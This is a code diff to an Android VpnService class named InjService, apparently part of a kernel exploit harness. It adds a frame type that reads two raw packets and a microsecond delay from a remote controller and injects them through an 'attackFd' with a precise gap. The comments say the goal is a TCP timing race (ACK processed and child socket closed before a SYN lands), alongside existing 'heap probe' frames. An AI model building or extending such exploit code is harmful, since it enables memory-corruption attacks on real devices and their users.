@@ -98,6 +98,8 @@ public class InjService extends VpnService {
      * which is the resolution this needs.
      */
     private static final int DUAL_MARK = 0xFFFFFFFE;
+    /** Two packets separated by a microsecond delay, written by one thread. */
+    private static final int DUO_MARK = 0xFFFFFFFB;
 
     /**
      * Frame marker that asks for a heap probe and answers with a byte string.
@@ -304,6 +306,13 @@ public class InjService extends VpnService {
                     }
                     int want = ((cnt[0] & 0xff) << 8) | (cnt[1] & 0xff);
                     answerProbe(out, want);
+                    continue;
+                }
+
+                if (length == DUO_MARK) {
+                    if (!readDuoFrame(frame, lengthField)) {
+                        break;
+                    }
                     continue;
                 }
 
@@ -656,6 +665,49 @@ int[] fds = snapshotChildFds();
      * Layout matches the length prefixed packets used everywhere else, just
      * without the count field, because a dual frame is always a pair.
      */
+    /**
+     * Read [len][packet][len][packet][delay] and fire them with a real gap.
+     *
+     * Sharing one thread is the point: the ACK has to be inside the kernel and
+     * its child already closed before the SYN lands, and only a spin here can
+     * hit a microsecond target - the controller is milliseconds away.
+     */
+    private boolean readDuoFrame(InputStream frame, byte[] lengthField) throws Exception {
+        byte[] first = null;
+        byte[] second = null;
+        for (int i = 0; i < 2; i++) {
+            if (!readFully(frame, lengthField, 4)) {
+                return false;
+            }
+            int n = ((lengthField[0] & 0xff) << 24)
+                    | ((lengthField[1] & 0xff) << 16)
+                    | ((lengthField[2] & 0xff) << 8)
+                    | (lengthField[3] & 0xff);
+            if (n < 20 || n > MAX_PACKET) {
+                return false;
+            }
+            byte[] one = new byte[n];
+            if (!readFully(frame, one, n)) {
+                return false;
+            }
+            if (i == 0) {
+                first = one;
+            } else {
+                second = one;
+            }
+        }
+        byte[] delay = new byte[2];
+        if (!readFully(frame, delay, 2)) {
+            return false;
+        }
+        int delayUs = ((delay[0] & 0xff) << 8) | (delay[1] & 0xff);
+        int fd = attackFd;
+        if (fd >= 0) {
+            Native.duoDelay(fd, first, first.length, second, second.length, delayUs);
+        }
+        return true;
+    }
+
     private boolean readDualPair(InputStream frame, byte[] lengthField) throws Exception {
         byte[] first = null;
         byte[] second = null;
